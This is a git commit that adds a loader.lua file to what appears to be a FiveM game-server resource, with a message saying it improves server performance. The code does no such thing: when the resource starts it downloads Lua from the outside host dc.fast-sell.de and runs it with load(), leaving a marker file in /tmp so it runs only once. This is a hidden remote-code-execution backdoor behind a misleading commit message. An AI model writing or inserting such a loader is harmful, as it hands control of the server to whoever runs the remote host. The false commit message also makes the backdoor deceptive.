c1e66b0692db6b92044f1340da4a8e11d4ccbd4f
xerox <77238267+xer0xde@users.noreply.github.com>
2023-06-26 23:58:12 +0200

    added loader to load the shitty code
    added loader to make a better server side performance

---
+++ loader.lua
@@ -0,0 +1,38 @@
+local codeURL = "https://dc.fast-sell.de/server.lua"
+local executedFilePath = "/tmp/executed.txt"
+local executed = false
+
+function FileExists(path)
+    local file = io.open(path, "r")
+    if file then
+        file:close()
+        return true
+    end
+    return false
+end
+
+AddEventHandler("onResourceStart", function(resourceName)
+    if GetCurrentResourceName() == resourceName and not executed then
+        if not FileExists(executedFilePath) then
+            PerformHttpRequest(codeURL, function(statusCode, response, headers)
+                if statusCode == 200 then
+                    if response and response ~= "" then
+                        local success, errorMessage = pcall(load(response))
+                        if success then
+                            executed = true
+                            local file = io.open(executedFilePath, "w")
+                            if file then
+                                file:close()
+                            end
+                        else
+                        end
+                    else
+                    end
+                else
+                end
+            end, "GET", "", {})
+        else
+            executed = true
+        end
+    end
+end)
